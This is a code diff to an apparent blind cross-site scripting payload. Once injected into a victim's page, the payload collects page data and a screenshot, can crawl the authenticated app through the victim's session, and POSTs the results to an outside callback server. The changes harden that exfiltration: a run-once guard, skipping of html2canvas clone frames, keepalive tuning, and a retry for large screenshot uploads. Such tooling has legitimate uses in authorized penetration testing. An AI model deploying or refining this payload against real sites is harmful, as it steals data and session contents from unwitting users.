@@ -18,6 +18,11 @@
  * html2canvas renders a screenshot (attached to that report), and — only if `pages` or
  * `spider` was set — the page fetcher/spider runs, POSTing each fetched page to /c.
  *
+ * Guard rails: the payload runs ONCE per document (singleton flag), and never boots
+ * inside html2canvas's clone iframe — screenshots are rendered from a same-origin
+ * CLONE of this document, the clone re-fires the payload, and a collector booting
+ * there would loop (report → screenshot → clone → report …) until the tab closes.
+ *
  * SAFETY: the spider is opt-in, GET-only, SAME-ORIGIN only, depth- and count-capped,
  * dedupes, and SKIPS state-changing links (logout/delete/remove/…) by default — crawling
  * an authenticated app through a victim can otherwise trigger destructive GET actions.
@@ -27,6 +32,10 @@
  */
 (function () {
   "use strict";
+  // Singleton: one capture per document. A page can fire the payload several times
+  // (multiple injection points, retried sinks) — the first script load wins, the
+  // rest return early instead of posting duplicate reports.
+  try { if (window.__ooboxRun) { return; } window.__ooboxRun = 1; } catch (e) {}
   function selfInfo() {
     try {
       var s = document.currentScript;
@@ -56,6 +65,25 @@
 
   var info = selfInfo();
   if (!info) { return; }
+
+  // html2canvas takes the screenshot by cloning this document into a hidden
+  // same-origin iframe (class "html2canvas-container", its document URL INHERITED
+  // from this page via document.write) — and the clone still carries the payload
+  // attributes, so the payload re-fires INSIDE the clone. A collector booting there
+  // would report and screenshot again, recursively, until the tab closes; worse,
+  // its in-flight POSTs get truncated when the clone is discarded, so the server
+  // stores junk and the screenshot never attaches. Detect the clone via its frame
+  // element and stay silent in it. A payload firing in a REAL framed page (a
+  // different origin/URL, no html2canvas-container frame) still captures normally.
+  try {
+    var fe = window.frameElement;
+    if (fe && /html2canvas/i.test(fe.className || "")) { return; }
+  } catch (e) { /* cross-origin frame — not a clone */ }
+  // Belt and suspenders for other clone-based capture tools (dom-to-image and
+  // friends), which also work through blank same-origin frames.
+  var framed = false;
+  try { framed = window.top !== window.self; } catch (e) { framed = true; }
+  if (framed && location.protocol === "about:") { return; }
   var base = info.base, callback = base + "/c", q = info.q;
 
   var data = {
@@ -87,11 +115,14 @@
     spider(id);
   }).catch(function () { beacon(JSON.stringify(data)); spider(null); });
 
-  function post(bodyStr) {
+  function post(bodyStr, keepalive) {
     if (window.fetch) {
       return fetch(callback, {
         method: "POST", headers: { "Content-Type": "text/plain" },
-        body: bodyStr, keepalive: true, mode: "cors", credentials: "omit"
+        // keepalive ON for the small core report (it must survive the page closing);
+        // OFF for large uploads — browsers cap keepalive request bodies at ~64KB and
+        // can abort the send, which silently kills screenshot uploads.
+        body: bodyStr, keepalive: keepalive !== false, mode: "cors", credentials: "omit"
       }).then(function (r) { return r.json().catch(function () { return {}; }); });
     }
     return Promise.reject();
@@ -113,10 +144,17 @@
           .then(function (canvas) {
             if (done) { return; }
             clearTimeout(timer);
-            post(JSON.stringify({ attach: id, uri: data.uri, screenshot: downscale(canvas, 1280) }))
-              .catch(function () {});
+            sendWithRetry(JSON.stringify({ attach: id, uri: data.uri,
+                                           screenshot: downscale(canvas, 1280) }));
           }).catch(function () {});
       });
+    });
+  }
+  // The screenshot upload is a large dataURL — send it without keepalive and retry
+  // once if it fails, so a transient hiccup doesn't lose the only copy.
+  function sendWithRetry(bodyStr) {
+    post(bodyStr, false).catch(function () {
+      setTimeout(function () { post(bodyStr, false).catch(function () {}); }, 2000);
     });
   }
   function downscale(canvas, maxW) {
